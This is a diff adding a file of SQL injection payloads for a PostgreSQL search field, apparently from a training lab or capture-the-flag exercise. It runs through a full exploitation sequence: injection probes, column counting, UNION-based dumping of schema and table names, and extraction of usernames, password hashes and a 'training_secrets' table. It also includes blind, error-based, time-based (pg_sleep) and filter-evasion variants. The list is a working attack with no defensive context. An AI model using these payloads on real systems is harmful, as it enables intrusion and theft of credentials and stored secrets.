@@ -1,0 +1,41 @@
+'
+''
+%'
+%''
+zzz%' OR '1'='1
+zzz%' OR '1'='1'-- -
+zzz%' OR 1=1-- -
+zzz%' AND 1=1-- -
+zzz%' AND 1=2-- -
+zzz%' AND '1'='1
+zzz%' ORDER BY 1-- -
+zzz%' ORDER BY 5-- -
+zzz%' ORDER BY 8-- -
+zzz%' ORDER BY 9-- -
+zzz%' ORDER BY 20-- -
+zzz%' UNION SELECT NULL-- -
+zzz%' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+zzz%' UNION SELECT 1,'a','b',1,1,1,'c','d'-- -
+zzz%' UNION SELECT 1,'a','b',0,0,0,'c','d'-- -
+zzz%' UNION SELECT 1,version(),current_user,0,0,0,'',''-- -
+zzz%' UNION SELECT 1,current_database(),current_schema(),0,0,0,'',''-- -
+zzz%' UNION SELECT 1,table_name,table_schema,0,0,0,'','' FROM information_schema.tables-- -
+zzz%' UNION SELECT 1,table_name,table_schema,0,0,0,'','' FROM information_schema.tables WHERE table_schema='public'-- -
+zzz%' UNION SELECT 1,column_name,data_type,0,0,0,'','' FROM information_schema.columns WHERE table_name='users'-- -
+zzz%' UNION SELECT 1,column_name,data_type,0,0,0,'','' FROM information_schema.columns WHERE table_name='training_secrets'-- -
+zzz%' UNION SELECT id,name,value,0,0,0,'','' FROM training_secrets-- -
+zzz%' UNION SELECT 1,username,email,0,0,0,'','' FROM users-- -
+zzz%' UNION SELECT 1,username,password_hash,0,0,0,'','' FROM users-- -
+zzz%' UNION SELECT 1,string_agg(name,','),string_agg(value,','),0,0,0,'','' FROM training_secrets-- -
+zzz%' AND (SELECT COUNT(*) FROM training_secrets)>0-- -
+zzz%' AND (SELECT substring(value,1,1) FROM training_secrets LIMIT 1)='V'-- -
+zzz%' AND 1=CAST((SELECT value FROM training_secrets LIMIT 1) AS int)-- -
+zzz%' AND 1=CAST((SELECT version()) AS int)-- -
+zzz%' AND pg_sleep(3) IS NULL-- -
+zzz%'; SELECT pg_sleep(3)-- -
+zzz%' || (SELECT pg_sleep(3))::text || '
+zzz%' AND (SELECT 1 FROM pg_sleep(3))=1-- -
+test' OR 'a'='a
+zzz%' /*comment*/ OR /**/ 1=1-- -
+zzz%' UnIoN SeLeCt NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
+zzz%' ORDER BY 1,2,3,4,5,6,7,8-- -
